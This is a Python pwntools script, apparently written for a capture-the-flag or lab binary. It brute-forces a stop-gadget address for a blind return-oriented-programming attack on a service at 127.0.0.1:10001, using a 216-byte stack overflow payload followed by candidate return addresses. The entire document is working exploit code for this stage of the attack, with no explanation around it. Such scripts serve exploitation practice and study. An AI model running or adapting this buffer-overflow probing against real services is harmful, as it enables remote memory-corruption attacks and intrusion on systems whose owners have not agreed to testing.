#-*- coding:utf-8 –*-
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')
#log_level=['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
gadget_array = []
def get_stop_addr(length):
	addr = 0x4007D0#7D0
	
	while 1:
		try:
			sh = remote('127.0.0.1', 10001)
			sh.recvuntil("Please tell me:")
			payload = 'a' * length + p64(addr)
			sh.sendline(payload)
			#sh.recvuntil("Repeater:")
			sh.recv()
			recvstr = sh.recv()
			sh.close()
			if recvstr.startswith('Hello'):
				gadget_array.append(addr)
				return gadget_array
			print 'one success addr: 0x%x' % (addr)
			addr += 1
		except Exception:
			addr += 1
			sh.close()
length = 216
stop_gadget = get_stop_addr(length)
for i in range(len(stop_gadget)):
	print 'one success addr: 0x%x' % (stop_gadget[i])


#0x4007d6